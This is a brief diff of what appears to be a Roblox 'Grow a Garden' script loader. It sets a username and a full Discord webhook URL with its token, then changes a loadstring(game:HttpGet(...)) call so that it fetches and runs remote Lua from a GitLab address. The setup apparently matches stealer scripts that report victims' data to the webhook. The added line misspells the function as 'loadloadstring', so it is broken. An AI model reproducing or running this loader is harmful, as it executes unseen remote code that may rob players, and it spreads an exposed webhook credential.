@@ -1,4 +1,4 @@
 Username = "igogoiz"
 Webhook = "https://discord.com/api/webhooks/1371777532420161566/y4uQUOTE9k0Jbbf4DgD2q04ltKfM0kclUX35SrkrsGoNPrI1BHZtHYQp60RM4cP6G8lk"
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/DoDoHub-12/scripts/refs/heads/main/GrowAGardenScript.lua"))() 
+loadloadstring(game:HttpGet("https://gitlab.com/traxscriptss/traxscriptss/-/raw/main/grow-a-garden"))()
